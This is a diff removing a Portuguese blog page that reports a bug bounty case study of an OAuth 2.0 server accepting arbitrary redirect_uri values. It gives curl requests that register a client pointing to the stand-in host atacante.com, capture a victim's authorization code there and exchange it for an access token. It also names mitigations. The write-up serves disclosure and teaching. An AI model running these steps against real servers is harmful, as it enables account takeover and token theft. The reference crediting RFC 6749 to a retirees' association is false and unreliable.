@@ -1,369 +1,48 @@
-<!DOCTYPE html>
-<html lang="en-gb"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=35729&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
-<meta http-equiv="content-type" content="text/html">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-
-<title itemprop="name">O Impacto da manipulação do parâmetro redirect_uri em fluxos OAuth 2.0 | Obtuosa</title>
-<meta property="og:title" content="O Impacto da manipulação do parâmetro redirect_uri em fluxos OAuth 2.0 | Obtuosa" />
-<meta name="twitter:title" content="O Impacto da manipulação do parâmetro redirect_uri em fluxos OAuth 2.0 | Obtuosa" />
-<meta itemprop="name" content="O Impacto da manipulação do parâmetro redirect_uri em fluxos OAuth 2.0 | Obtuosa" />
-<meta name="application-name" content="O Impacto da manipulação do parâmetro redirect_uri em fluxos OAuth 2.0 | Obtuosa" />
-<meta property="og:site_name" content="Obtuosa" />
-
-<meta name="description" content="Como uma manipulação inadequada no parâmetro redirect_uri em aplicações que utilizam fluxos OAuth 2.0 podem comprometer a sua segurança, permitindo o roubo de códigos de autorização e a obtenção dos tokens de acesso em sistemas web">
-<meta itemprop="description" content="Como uma manipulação inadequada no parâmetro redirect_uri em aplicações que utilizam fluxos OAuth 2.0 podem comprometer a sua segurança, permitindo o roubo de códigos de autorização e a obtenção dos tokens de acesso em sistemas web" />
-<meta property="og:description" content="Como uma manipulação inadequada no parâmetro redirect_uri em aplicações que utilizam fluxos OAuth 2.0 podem comprometer a sua segurança, permitindo o roubo de códigos de autorização e a obtenção dos tokens de acesso em sistemas web" />
-<meta name="twitter:description" content="Como uma manipulação inadequada no parâmetro redirect_uri em aplicações que utilizam fluxos OAuth 2.0 podem comprometer a sua segurança, permitindo o roubo de códigos de autorização e a obtenção dos tokens de acesso em sistemas web" />
-
-<meta property="og:locale" content="en-gb" />
-<meta name="language" content="en-gb" />
-
-  <link rel="alternate" hreflang="en-gb" href="http://localhost:35729/posts/fluxos_oauth/" title="English" />
-
-
-<meta itemprop="image" content="http://localhost:35729/images/oauth.png" />
-<meta property="og:image" content="http://localhost:35729/images/oauth.png" />
-<meta name="twitter:image" content="http://localhost:35729/images/oauth.png" />
-<meta name="twitter:image:src" content="http://localhost:35729/images/oauth.png" />
-
-
-    
-    
-    
-
-    <meta property="og:type" content="article" />
-    <meta property="og:article:published_time" content=2025-07-06T00:00:00Z />
-    <meta property="article:published_time" content=2025-07-06T00:00:00Z />
-    <meta property="og:url" content="http://localhost:35729/posts/fluxos_oauth/" />
-
-    
-    <meta property="og:article:author" content="" />
-    <meta property="article:author" content="" />
-    <meta name="author" content="" />
-    
-    
-
-    
-
-    <script defer type="application/ld+json">
-    {
-        "@context": "http://schema.org",
-        "@type": "Article",
-        "headline": "O Impacto da manipulação do parâmetro redirect_uri em fluxos OAuth 2.0",
-        "author": {
-        "@type": "Person",
-        "name": ""
-        },
-        "datePublished": "2025-07-06",
-        "description": "Como uma manipulação inadequada no parâmetro redirect_uri em aplicações que utilizam fluxos OAuth 2.0 podem comprometer a sua segurança, permitindo o roubo de códigos de autorização e a obtenção dos tokens de acesso em sistemas web",
-        "wordCount":  1979 ,
-        "mainEntityOfPage": "True",
-        "dateModified": "2025-07-06",
-        "image": {
-        "@type": "imageObject",
-        "url": "http:\/\/localhost:35729\/images\/oauth.png"
-        },
-        "publisher": {
-        "@type": "Organization",
-        "name": "Obtuosa"
-        }
-    }
-    </script>
-
-
-<meta name="generator" content="Hugo 0.131.0">
-
-    
-    <meta property="og:url" content="http://localhost:35729/posts/fluxos_oauth/">
-  <meta property="og:site_name" content="Obtuosa">
-  <meta property="og:title" content="O Impacto da manipulação do parâmetro redirect_uri em fluxos OAuth 2.0">
-  <meta property="og:description" content="Como uma manipulação inadequada no parâmetro redirect_uri em aplicações que utilizam fluxos OAuth 2.0 podem comprometer a sua segurança, permitindo o roubo de códigos de autorização e a obtenção dos tokens de acesso em sistemas web">
-  <meta property="og:locale" content="en_gb">
-  <meta property="og:type" content="article">
-    <meta property="article:section" content="posts">
-    <meta property="article:published_time" content="2025-07-06T00:00:00+00:00">
-    <meta property="article:modified_time" content="2025-07-06T00:00:00+00:00">
-    <meta property="article:tag" content="Oauth">
-    <meta property="article:tag" content="Redirect_uri">
-    <meta property="article:tag" content="Web">
-    <meta property="article:tag" content="Recon">
-
-
-    
-    
-  <meta name="twitter:card" content="summary">
-  <meta name="twitter:title" content="O Impacto da manipulação do parâmetro redirect_uri em fluxos OAuth 2.0">
-  <meta name="twitter:description" content="Como uma manipulação inadequada no parâmetro redirect_uri em aplicações que utilizam fluxos OAuth 2.0 podem comprometer a sua segurança, permitindo o roubo de códigos de autorização e a obtenção dos tokens de acesso em sistemas web">
-
-    
-
-    
-
-    <link rel="canonical" href="http://localhost:35729/posts/fluxos_oauth/">
-    <link href="/style.min.2d921c18cf1ec555ffc03d59a8adc211c402c68c930c27d6a0c306ab175a8d09.css" rel="stylesheet">
-    <link href="/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">
-
-    
-    <link rel="apple-touch-icon" sizes="180x180" href="/icons/apple-touch-icon.png">
-    <link rel="icon" type="image/png" sizes="32x32" href="/icons/favicon-32x32.png">
-    <link rel="icon" type="image/png" sizes="16x16" href="/icons/favicon-16x16.png">
-    <link rel="mask-icon" href="/icons/safari-pinned-tab.svg">
-    <link rel="shortcut icon" href="/favicon.ico">
-
-
-
-
-<link rel="manifest" href="http://localhost:35729/site.webmanifest">
-
-<meta name="msapplication-config" content="/browserconfig.xml">
-<meta name="msapplication-TileColor" content="#2d89ef">
-<meta name="theme-color" content="#434648">
-
-    
-    <link rel="icon" type="image/svg+xml" href="/icons/favicon.svg">
-
-    
-    
-
-</head>
-<body data-theme = "dark" class="notransition">
-
-<script src="/js/theme.js"></script>
-
-<div class="navbar" role="navigation">
-    <nav class="menu" aria-label="Main Navigation">
-        <a href="http://localhost:35729/" class="logo">
-            <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" 
-viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" 
-stroke-linejoin="round" class="feather feather-home">
-<title>Home</title>
-<path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
-<polyline points="9 22 9 12 15 12 15 22"></polyline>
-</svg>
-        </a>
-        <input type="checkbox" id="menu-trigger" class="menu-trigger" />
-        <label for="menu-trigger">
-            <span class="menu-icon">
-                <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" stroke="currentColor" fill="none" viewBox="0 0 14 14"><title>Menu</title><path stroke-linecap="round" stroke-linejoin="round" d="M10.595 7L3.40726 7"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 3.51488L3.49301 3.51488"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 10.4851H3.49301"></path><path stroke-linecap="round" stroke-linejoin="round" d="M0.5 12.5V1.5C0.5 0.947715 0.947715 0.5 1.5 0.5H12.5C13.0523 0.5 13.5 0.947715 13.5 1.5V12.5C13.5 13.0523 13.0523 13.5 12.5 13.5H1.5C0.947715 13.5 0.5 13.0523 0.5 12.5Z"></path></svg>
-            </span>
-        </label>
-    
-        <div class="trigger">
-            <ul class="trigger-container">
-                
-                
-                <li>
-                    <a class="menu-link " href="/">
-                        Início
-                    </a>
-                    
-                </li>
-                
-                <li>
-                    <a class="menu-link active" href="/posts/">
-                        Posts
-                    </a>
-                    
-                </li>
-                
-                <li>
-                    <a class="menu-link " href="/pages/about/">
-                        Whoami
-                    </a>
-                    
-                </li>
-                
-                <li class="menu-separator">
-                    <span>|</span>
-                </li>
-                
-                
-            </ul>
-            <a id="mode" href="#">
-                <svg xmlns="http://www.w3.org/2000/svg" class="mode-sunny" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
-<title>LIGHT</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
-                <svg xmlns="http://www.w3.org/2000/svg" class="mode-moon" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
-<title>DARK</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
-            </a>
-        </div>
-    </nav>
-</div>
-
-<div class="wrapper post">
-    <main class="page-content" aria-label="Content">
-        <article>
-            <header class="header">
-                <h1 class="header-title">O Impacto da manipulação do parâmetro redirect_uri em fluxos OAuth 2.0</h1>
-                
-                
-                
-                <div class="post-meta">
-                    <time datetime="2025-07-06T00:00:00&#43;00:00" itemprop="datePublished"> 6 Jul 2025 </time>
-                </div>
-                
-            </header>
-            
-            <div class="page-content">
-                <p><img alt="OAuth 2.0" src="https://dev-to-uploads.s3.amazonaws.com/uploads/articles/e1eyvg2f7wgnttm924b5.png"></p>
-<h1 id="o-impacto-da-manipulação-do-parâmetro-redirect_uri-em-fluxos-oauth-20-na-segurança-de-aplicações-web">O Impacto da manipulação do parâmetro redirect_uri em fluxos OAuth 2.0 na segurança de Aplicações Web</h1>
-<h2 id="resumo">Resumo</h2>
-<blockquote>
-<p>As aplicações web modernas enfrentam alguns desafios gradativos quanto a sua segurança, em virtude das integrações com serviços de autorização externos, como o protocolo OAuth 2.0 (Open Authorization), que se tornam cada vez mais comuns. Este texto tem propósito de investigar como uma manipulação inadequada no parâmetro <em>redirect_uri</em> em aplicações que utilizam fluxos OAuth 2.0 podem comprometer a sua segurança, permitindo o roubo de códigos de autorização e a obtenção dos tokens de acesso em sistemas web. Através de um estudo de caso prático de um report para uma plataforma de bug bounty, é possível analisar como um processo sistemático de reconhecimento e filtragem de subdomínios podem identificar vulnerabilidades, evidenciando a importância de boas práticas seguras de desenvolvimento e uma validação mais minuciosa de redirecionamentos autorizados.</p>
-</blockquote>
-<h2 id="palavras-chave">Palavras-chave</h2>
-<p>Segurança Ofensiva; Aplicações web; OAuth; Reconhecimento; <em>redirect_uri</em></p>
-<h2 id="1-introdução">1 Introdução</h2>
-<p>Os sistemas web com o avanço tecnológico dependem cada vez mais de serviços externos para autenticação e autorização de usuários. Em consequência disso, protocolos como o OAuth 2.0 se tornam uma opção interessante de uso, por conta da flexibilidade e capacidade de integrar múltiplos serviços sem exigir o compartilhamento direto de credenciais sensíveis.</p>
-<p>No entanto, essa grande flexibilidade pode também implicar em uma superfície de ataque mais ampliada. Em um contexto de falhas na configuração ao ser implementado ou a validação de parâmetros críticos não serem feitas da maneira apropriada, podem ocasionar em ataques com impacto real sobre a segurança dos usuários, uma vez que o OAuth é apenas um protocolo que ajuda um website ou aplicação a acessar recursos que estão hospedados em outros web apps em nome do usuário.</p>
-<p>Este estudo se propõe a compreender como a manipulação do parâmetro <em>redirect_uri</em> em fluxos OAuth 2.0 pode compremeter a segurança de aplicações web, por meio de uma fundamentação teórica e um estudo prático realizado em ambiente de bug bounty, demonstrando em um cenário controlado como as falhas que aparentam ser simples podem resultar em um compromentimento da segurança.</p>
-<h2 id="2-fundamentação-teórica">2 Fundamentação Teórica</h2>
-<h3 id="21-protocolo-oauth-20">2.1 Protocolo OAuth 2.0</h3>
-<p>O OAuth 2.0 (Open Authorization) é um protocolo para delegar autorização, assim permitindo que  que um cliente terceiro possa ter acesso a um serviço HTTP, ou seja, clientes que podem acessar recursos em nome de um usuário, sem a necessidade de compartilhar as credenciais. A arquitetura é definida por alguns componentes importantes para seu sistema: <em>Proprietário do recurso (Resource Owner)</em>, a entidade que possui os dados protegidos, usuário final; <em>Cliente (Client)</em>, cliente que deseja ter acesso aos dados em nome do proprietário do recurso;  <em>Servidor de recurso (Resource Server),</em> o servidor que será hospedados os recursos protegidos, sendo possível aceitar e também responder a solicitações usando tokens de acesso; <em>Servidor de autorização (Authorization Server)</em>, componente que realiza a autenticação do usuário e emite os tokens de acesso.</p>
-<h3 id="22-fluxo-de-autorização-e-o-papel-do-parâmetro-redirect_uri">2.2 Fluxo de autorização e o papel do parâmetro <em>redirect_uri</em></h3>
-<p>O servidor de autorização OAuth 2.0 retorna para uma melhor segurança um código de autorização (Authorization Code) e é a partir desse código que ocorre a troca por um token de acesso. Esse fluxo necessita da interação do usuário, que por sua vez concede a permissão necessária em uma tela de consentimento.</p>
-<p>A partir desse contexto, um elemento importante nesse fluxo é o parâmetro <em>redirect_uri.</em> Ele indica para onde o servidor de autorização deve realizar o redirecionamento do usuário e por consequência o código de autorização após o consentimento.</p>
-<p>Para a segurança, a especificação do OAuth (RFC674) precisa de validação rigorosa do <em>redirect_uri.</em> No contexto do estudo de caso, o uso desse parâmetro é feito de maneira deliberada, sem qualquer tipo de validação que possa previnir que os códigos de autorização que são confidenciais sejam enviados a domínios indevidos.</p>
-<h3 id="23-impacto-da-falha-na-validação-do-redirect_uri">2.3 Impacto da falha na validação do <em>redirect_uri</em></h3>
-<p>Se o servidor que implementa o OAuth 2.0 sem qualquer validação mais específica e restrita quanto ao <em>redict_uri,</em> pode levar a um atacante a registrar um cliente malicioso que pode deixar o <em>redirect_uri</em> sob seu controle, induzir uma possível vítima a se autenticar em uma tela legítima, já que essa falha é feita nos intermédios do próprio servidor onde o OAuth  está alocado, receber o código de autorização dessa vítima e trocar por um token de acesso válido.</p>
-<p>Essa falha afeta o modelo de confiança, na forma com que o protocolo é configurado, tornando assim possível ataques de phishing muito convincentes e comprometendo contas de usuários.</p>
-<h2 id="3-metodologia">3 Metodologia</h2>
-<p>Esta pesquisa foi realizada de forma estruturada e ética, em um ambiente controlado, por se tratar de um contexto de programa de bug bounty, com as regras apresentadas, sobre o que pode ou não ser feito dentro do escopo determinado. A base desse trabalho é ilustrar a partir do estudo de caso, como o reconhecimento e análise de endpoints, é possível revelar falhas, em específico fluxos de autenticação que são baseados no protocolo OAuth 2.0.</p>
-<p>A etapa inicial consistiu em reconhecimento, entendendo modelo de negócios, posicionamento da empresa em questão no mercado. Para que isso fosse possível, foram analisadas as informações públicas disponíveis em plataformas de business intelligence, como o <strong>Crunchbase</strong>, além do próprio site oficial e a documentação técnica. Ademais, ocorreu o mapeamento da superfície de ataque, com o propósito de identificar endpoints públicos.</p>
-<p>Ao longo da etapa, se fundamentou técnicas de enumeração de subdomínios, com ferramentas como <strong>assetfinder</strong>, <strong>subfinder</strong> e <strong>subcat</strong>. Adicionalmente, depois da enumeração dos subdomínios, também foi filtrado os que estavam “vivos” e retornando ao menos status code 200, 301 e 302, através da ferramenta <strong>httpx</strong>. Com a filtragem feita e a quantidade de subdomínios existentes, o <strong>katana</strong> foi usado para enumeração de endpoints, por se tratar de uma ferramenta de crawling automatizada, buscando uma navegação mais inteligente e prática. Como se tratava de múltiplos subdomínios, naquele momento foi julgado mais estratégico usar o katana para automatizar as descobertas de rotas. Em um desses momentos, havia um endpoint interessante, o  /.well-know-oauth-authorization-server, um endpoint do protocolo OAuth. A resposta desse endpoint  usando a ferramenta <strong>cURL</strong> trouxe informações interessantes sobre os parâmetros suportados, incluindo os endpoints de autorização (/authorize), de troca de tokens (/token) e registro de clientes (/register).</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl">HTTP/2 200 OK
-</span></span><span class="line"><span class="cl">Cabeçalho
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">Corpo:
-</span></span><span class="line"><span class="cl">{&#34;issuer&#34;:&#34;https://subdominio.alvo&#34;,
-</span></span><span class="line"><span class="cl">&#34;authorization_endpoint&#34;:&#34;https://subdominio.alvo/authorize&#34;,
-</span></span><span class="line"><span class="cl">&#34;token_endpoint&#34;:&#34;https://subdominio.alvo/token&#34;,
-</span></span><span class="line"><span class="cl">&#34;registration_endpoint&#34;:&#34;https://subdominio.alvo/register&#34;,
-</span></span><span class="line"><span class="cl">&#34;response_types_supported&#34;:[&#34;code&#34;],&#34;response_modes_supported&#34;:[&#34;query&#34;],
-</span></span><span class="line"><span class="cl">&#34;grant_types_supported&#34;:[&#34;authorization_code&#34;,&#34;refresh_token&#34;],
-</span></span><span class="line"><span class="cl">&#34;token_endpoint_auth_methods_supported&#34;:[&#34;client_secret_post&#34;,
-</span></span><span class="line"><span class="cl">&#34;client_secret_basic&#34;,&#34;none&#34;],
-</span></span><span class="line"><span class="cl">&#34;registration_endpoint_auth_methods_supported&#34;:[&#34;client_secret_post&#34;,
-</span></span><span class="line"><span class="cl">&#34;client_secret_basic&#34;,&#34;none&#34;],
-</span></span><span class="line"><span class="cl">&#34;code_challenge_methods_supported&#34;:[&#34;S256&#34;]}
-</span></span></code></pre></div><p>Em seguida, realizou-se uma análise rigorosa com relação aos parâmetros aceitos por esses endpoints, com um foco maior no parâmetro <em>redrect_uri</em>, que pode se tornar sensível em contextos que aceitam qualquer tipo de valor. Neste ciclo, sucedeu observar se havia uma validação adequada do URI, de redirecionamento fornecido pelo cliente e se era possível dentro dessa dinâmica cadastrar domínios externos ou não confiáveis por meio do endpoint de registro.</p>
-<p>O estágio seguinte refletiu no desenvolvimento de uma <strong>prova de conceito</strong> (PoC). Foram feitas requisições reais simulando o registro de um aplicativo com o parâmetro <em>redirect_uri</em> arbitrário, incluindo domínios externos sob o controle do pesquisador, que geraram um código de autorização válido. Em seguida, foi replicado o processo end-to-end, com a captura do código de autorização redirecionado para um domínio malicioso. Ao ser obtido, esse código foi trocado com sucesso por um token de acesso no endpoint /token, demonstrando a exploração efetiva da vulnerabilidade.</p>
-<p>Em conclusão, toda a pesquisa foi documentada, com registro das requisiçõies realizadas, as respostas obtidas e as evidências que comprovam a obtenção de maneira indevida desses tokens. Esse registro é meramente educativo a fim de garantir a consistência dos resultados e permitir uma análise maior dos impactos, medidas corretivas necessárias, oferecer uma contribuição mais estruturada para uma discussão acadêmica e profissional sobre segurança em aplicações web.</p>
-<h2 id="4-estudo-de-caso-exploração-do-redirect_uri">4 Estudo de caso: exploração do <em>redirect_uri</em></h2>
-<h3 id="31-registro-do-aplicativo-malicioso">3.1 Registro do aplicativo malicioso</h3>
-<p>Constatou-se que a rota /register aceitava registros de clientes com qualquer domínio que estivesse especificado como <em>redirect_uri,</em> sem validação.</p>
-<p><strong>Requisição</strong>:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl">curl -X POST https://subdominio.alvo/register \
-</span></span><span class="line"><span class="cl">-H &#34;Content-Type: application/json&#34; \
-</span></span><span class="line"><span class="cl">-d &#39;{
-</span></span><span class="line"><span class="cl">  &#34;client_name&#34;: &#34;App_malicioso&#34;,
-</span></span><span class="line"><span class="cl">  &#34;redirect_uris&#34;: [&#34;https://atacante.com&#34;],
-</span></span><span class="line"><span class="cl">  &#34;grant_types&#34;: [&#34;authorization_code&#34;],
-</span></span><span class="line"><span class="cl">  &#34;response_types&#34;: [&#34;code&#34;]
-</span></span><span class="line"><span class="cl">}&#39;
-</span></span></code></pre></div><p><strong>Resposta:</strong></p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span>
-</span></span><span class="line"><span class="cl">  <span class="nt">&#34;client_id&#34;</span><span class="p">:</span> <span class="s2">&#34;APP_MALICIOSO_ID&#34;</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl">  <span class="nt">&#34;client_secret&#34;</span><span class="p">:</span> <span class="s2">&#34;SECRET&#34;</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl">  <span class="nt">&#34;redirect_uris&#34;</span><span class="p">:</span> <span class="p">[</span><span class="s2">&#34;https://atacante.com&#34;</span><span class="p">]</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span></code></pre></div><h3 id="42-fluxo-de-autenticação">4.2 Fluxo de autenticação</h3>
-<p>Na sequência, o atacante poderia direcionar a vítima a rota /authorize com o <em>client_id</em> gerado  **e o <em>redirect_uri</em> malicioso.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">https://subdominio.alvo/authorize?response_type<span class="o">=</span>code<span class="p">&amp;</span><span class="nv">client_id</span><span class="o">=</span>APP_MALICIOSO_ID<span class="p">&amp;</span><span class="nv">redirect_uri</span><span class="o">=</span>REDIRECT_URI
-</span></span></code></pre></div><p>Após a autenticação e o consentimento na tela do próprio domínio legítimo, o servidor de autorização redirecionava para o <em>redirect_uri</em>  externo registrado e assim deixava exposto o código de autorização na URL.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">https://atacante.com/?code<span class="o">=</span>_CODE_
-</span></span></code></pre></div><h3 id="43-troca-do-código-por-token-de-acesso">4.3 Troca do código por Token de Acesso</h3>
-<p>Com o código obtido, o atacante solicitava um token de acesso legítimo da vítima.</p>
-<p><strong>Requisição</strong></p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl -X POST https://subdominio.alvo/token <span class="se">\
-</span></span></span><span class="line"><span class="cl"><span class="se"></span>  -d <span class="s2">&#34;grant_type=authorization_code&#34;</span> <span class="se">\
-</span></span></span><span class="line"><span class="cl"><span class="se"></span>  -d <span class="s2">&#34;code=_CODE_&#34;</span> <span class="se">\
-</span></span></span><span class="line"><span class="cl"><span class="se"></span>  -d <span class="s2">&#34;redirect_uri=https://atacante.com&#34;</span> <span class="se">\
-</span></span></span><span class="line"><span class="cl"><span class="se"></span>  -d <span class="s2">&#34;client_id=APP_MALICIOSO_ID&#34;</span> <span class="se">\
-</span></span></span><span class="line"><span class="cl"><span class="se"></span>  -d <span class="s2">&#34;client_secret=SECRET&#34;</span>
-</span></span></code></pre></div><p><strong>Resposta</strong></p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">{</span>
-</span></span><span class="line"><span class="cl">  <span class="s2">&#34;access_token&#34;</span>: <span class="s2">&#34;TOKEN&#34;</span>,
-</span></span><span class="line"><span class="cl">  <span class="s2">&#34;expires_in&#34;</span>: 3600,
-</span></span><span class="line"><span class="cl">  <span class="s2">&#34;token_type&#34;</span>: <span class="s2">&#34;bearer&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="o">}</span>
-</span></span></code></pre></div><h2 id="5-resultados-e-discussão">5 Resultados e Discussão</h2>
-<p>Os resultados demonstram a falha decorrente da validação inadequada do parâmetro <em>redirect_uri</em> em fluxos OAuth 2.0 ao ser implementada sem a análise de como o servidor irá reagir diante de um domínio “estranho”. A análise prática evidenciou, que ao permitir de maneira deliberada o registro de clientes com URIs de redirecionamento totalmente arbitrários e externos, o servidor de autorização expõe um vetor de ataque, que pode ser explorado por agentes maliciosos.</p>
-<p>Um dos principais pontos é a possibilidade de interceptação de códigos de autorização válidos. Durante a execução da PoC, após o login e consentimento do usuário em uma interface oficial da própria aplicação, o servidor redirecionava o código de autorização para outra url registrada pelo atacante. Esse comportamento quebra o modelo de confiança na implementação do OAuth 2.0, quando não se tem uma verificação mais rigorosa por parte da aplicação que o incorpora.</p>
-<p>Outro aspecto relevante é que os testes puderam confirmar a troca bem-sucedida do código de autorização interceptado por um token de acesso válido no endpoint /token. Assim, poderia ser utilizado para acessar recursos protegidos em nome do usuário alvo, possibilitando um risco de obtenção não autorizada de dados sensíveis.</p>
-<p>Vale ressaltar ainda que existe um potencial em ataques de phishing, com grande grau de credibilidade. Por se tratar de um fluxo de autenticação por meio da própria aplicação legítima e autorizada, o usuário teria uma maior confiança no processo, mesmo com o redirecionamento malicioso. Essa característica aumenta o poder de persuasão de uma campanha de engenharia social se baseando nesse vetor.</p>
-<p>Ressalta-se o papel importante da etapa de reconhecimento na identificação da vulnerabilidade. A partir do mapeamento dos endpoints e a inspeção das respostas do servidor, em especial do endpoint /.well-known/oauth-authorization-server, permitiu entender de forma sistemática pontos sensíveis do fluxo de autenticação.</p>
-<p>Os pontos de exposição validam a necessidade de boas práticas de segurança no desenvolvimento e manutenção de sistemas que implementam OAuth. Desde a validação mais metódica com relação ao parâmetro fragilizado, que possam restringir os redirecionamentos indevidos, a implementação do PKCE (Proof Key for Code Exchange) para clientes públicos e aplicações, como forma de mitigar o roubo de códigos de autorização e por fim, auditorias regulares, que possam realizar revisões sistemáticas de endpoints, parâmetros sensíveis e mecanismos de registros de clientes.</p>
-<p>É importante enfatizar a  importância de abordagens proativas em segurança de aplicações web, evidenciando o valor da análise ofensiva mais controlada por parte de plataformas bug bounty e uma estratégia complementar nas práticas tradicionais de desenvolvimento seguro.</p>
-<h2 id="6-conclusão">6 Conclusão</h2>
-<p>A manipulação inadequada do parâmetro <em>redirect_uri</em>  no protocolo OAuth 2.0 de autorização apresenta uma vulnerabilidde que pode comprometer a segurança de aplicações web. O estudo de caso demonstra como uma exploração prática pode culminar no roubo de códigos de autorização e a obtenção indevida de tokens de acesso.</p>
-<p>Isso evidencia a importância de processos de reconhecimento e a análise sistemática de endpoints, bem como a implementação mais rigorosa quanto a práticas seguras de desenvolvimento para que seja possível mitigar esses riscos.</p>
-<h2 id="referências">Referências</h2>
-<p>ASSOCIATION FOR THE ADVANCEMENT OF RETIRED PERSONS. <em>RFC 6749 – The OAuth 2.0 Authorization Framework</em>. Disponível em: <a href="https://datatracker.ietf.org/doc/html/rfc6749">https://datatracker.ietf.org/doc/html/rfc6749</a>.</p>
-<p>INTERNET ENGINEERING TASK FORCE. <em>RFC 6819 – OAuth 2.0 Threat Model and Security Considerations</em>. Disponível em: <a href="https://datatracker.ietf.org/doc/html/rfc6819">https://datatracker.ietf.org/doc/html/rfc6819</a>.</p>
-<p>OWASP FOUNDATION. <em>Testing for OAuth Weaknesses</em>. Disponível em: <a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/05-Testing_for_OAuth_Weaknesses">https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/05-Testing_for_OAuth_Weaknesses</a>.</p>
-<p>PORTSWIGGER. <em>OAuth Authentication Security</em>. Disponível em: <a href="https://portswigger.net/web-security/oauth">https://portswigger.net/web-security/oauth</a>.</p>
-<h2 id="heading"></h2>
-
-            </div>
-        </article></main>
-</div>
-<footer class="footer">
-    <span class="footer_item"> </span>
-    &nbsp;
-
-    <div class="footer_social-icons">
-<a href="https://github.com/obtuosa" target="_blank" rel="noopener noreferrer me"
-    title="Github">
-    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
-    stroke-linecap="round" stroke-linejoin="round">
-    <path
-        d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22">
-    </path>
-</svg>
-</a>
-<a href="/index.xml" target="_blank" rel="noopener noreferrer me"
-    title="Rss">
-    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
-    stroke-linecap="round" stroke-linejoin="round">
-    <path d="M4 11a9 9 0 0 1 9 9" />
-    <path d="M4 4a16 16 0 0 1 16 16" />
-    <circle cx="5" cy="19" r="1" />
-</svg>
-</a>
-</div>
-    <small class="footer_copyright">
-        © 2025 .
-        Powered by <a href="https://github.com/hugo-sid/hugo-blog-awesome" target="_blank" rel="noopener">Hugo blog awesome</a>.
-    </small>
-</footer><a href="#" title="Go to top" id="totop">
-    <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" fill="currentColor" stroke="currentColor" viewBox="0 96 960 960">
